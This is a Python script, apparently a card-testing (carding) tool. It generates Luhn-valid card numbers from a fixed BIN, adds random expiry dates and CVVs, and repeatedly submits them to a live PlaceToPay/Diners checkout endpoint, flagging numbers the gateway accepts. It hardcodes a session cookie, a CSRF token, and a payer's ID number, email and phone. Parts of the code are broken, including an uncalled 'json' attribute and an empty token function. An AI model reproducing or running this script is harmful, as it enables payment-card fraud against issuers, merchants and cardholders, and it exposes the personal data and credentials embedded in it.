import random
import requests
import base64
import os

def number_():
    bin = "43810864"
    count = len(bin)
    count = 16-count
    while True:
        n_c = bin
        for i in range(count):
            n_c += str(random.randint(0,9))
        a = 0
        for i in range(16):
            if i  % 2 == 0:
                if int(n_c[i])*2 >=10:
                    j = str(int(n_c[i])*2)
                    j = int(j[0])+int(j[1])
                    a += j
                else:
                    a += int(n_c[i])*2
            else:
                a += int(n_c[i])
        if a % 10 == 0:
            return str(n_c)
        else:
            continue

def fecha_():
    mes = str(random.randint(1,12))
    if len(mes) == 1:
        mes += "0"
        mes = mes[::-1]
    ao = str(random.randint(2023,2025))
    fecha = f"{mes}|{ao[2:]}"
    return fecha

def cvv_():
    cvv = str(random.randint(10,999))
    if len(cvv) == 2:
        cvv = cvv[::-1]
        cvv += "0"
        cvv = cvv[::-1]

    return cvv

def base_64(number):
    number_code = number.encode('ascii')
    number_code = base64.b64encode(number_code)
    number = number_code.decode('ascii')
    return number

def place_to_pay(number_code):
    url = "https://checkout.placetopay.ec/diners/extra/16018498/f2c944169391a6a19a4d0d79a93518c1"
    params = {'action': 'otpGenerate', 'wallet': {'id': None, 'method': None}, 'instrument': {'card': {'number': number_code, 'brand': 'visa', 'expiration': '', 'cvv': '', 'installments': '', 'register': False, 'address': {'postalCode': None}}}, 'payer': {'document': '1715839419', 'documentType': 'CI', 'name': 'William', 'surname': 'Orlando', 'company': None, 'email': 'pomoli2219@serosin.com', 'address': {'postalCode': None, 'street': 'la tronco', 'city': None, 'state': None, 'country': None, 'phone': None}, 'mobile': '0960847852'}, 'gateway': 'diners'}
    cookie = {'webcheckout_placetopay_session': 'eyJpdiI6Im5Ka3Q1c2dZUU5tMHZCelBkeTNVa2c9PSIsInZhbHVlIjoiaEFJaitMM3NsSVh5Um5nTWJJcmtWa2VGTENSTVN2YktpMEkzTHVLUVBBS3dxc2RyTXhJdTdRMGJOT2xTQm5tYU94VDNvbHRsRWN0bTRhRjBHRXdDRS9JUHBMQ0tyUGpqeDQ5QnI5ODI2czFKQ1YyOVRoUTYxWWhmTk5NQlZJV2wiLCJtYWMiOiI2MDIwMjMxMGY4NDIwNTM4MjQ2MzhiMGIxYmE2NTY5YWNlZTFlY2QyMTE1MmRiNDQ3MmIzNmMzZDhjMjYzZDViIiwidGFnIjoiIn0%3D'}
    header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0","X-Csrf-Token": "KoYRtP8eumg1XynLBYtZBP7Ea0gvwBjT089o90M4","Content-Type": "application/json"}
    return  requests.post(url, cookies=cookie, headers=header, json=params, timeout= 60)
    
def token_generator():
    pass

def main ():
    cls = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
    cls()
    token = token_generator()
    contador = 0
    print(f"token asignado:  {token}")
    numerador = 0
    while True:
        number = number_()
        fecha = fecha_()
        cvv = cvv_()
        number_code = base_64(number)
        while True:
            r1 = place_to_pay(number_code)
            if r1.text.count("se ha procesado correctamente") == 1:
                numerador += 1
                print(f"({numerador})  {number}|" + fecha + f"|{cvv} = {number_code}  ==  {r1.json()['status']['message']}")
                # params = {"localTime":1657498687466,"recurringValue":False,"billing":{"isCompany":0,"sameDelivery":True,"name":"jorge ramirez","email":"jecex41335@lenfly.com","country":"EC"},"payment":{"paymentMethod":"CC","cardType":"visa","cardNumber":number,"cardExpDate":fecha,"cardCVV":cvv,"cardTime":11.059999999999999,"holderTime":5.027}}
                # res2 = verfic_bot(params,token)
                # g = verific_message(res2,params,number,fecha,cvv)
                # contador += 1
                # if g != 0:
                #     token = g
                #     contador = 0
                break
            elif r1.text.count("9999") == 1:
                numerador += 1
                print(f"({numerador})  {number}|" + fecha + f"|{cvv} = {number_code}  ==  {r1.json()['status']['message']}")
                break
            elif r1.text.count("external_service_failed") == 1:
                print(f"{number}|" + fecha + f"|{cvv} = {number_code}  ==  {r1.json()['status']['message']}")
                continue
            elif r1.text.count("NA") == 1:
                print(f"{number}|" + fecha + f"|{cvv} = {number_code}  ==  {r1.json()['status']['message']}")
                if r1.json["status"]["message"] == "La sesión ha expirado":
                    print("session expirada cerrando programa..")
                    exit()
                elif r1.json["status"]["message"] == "Error 0011WS BANKPICHINCHA - Generar el OTP, causa:  ERROR COMUNICACION":
                    print("Error de comunicacion intentelo de nuevo mas tarde...")
                    exit()
            else:
                print(f"{number}|" + fecha.replace("/","|") + f"|{cvv} = {number_code}  ==  {r1.json()['status']['message']}")
                print(r1)
                print(r1.json())
                input("oprima una tecla")
                exit()







if __name__ == "__main__":
    main()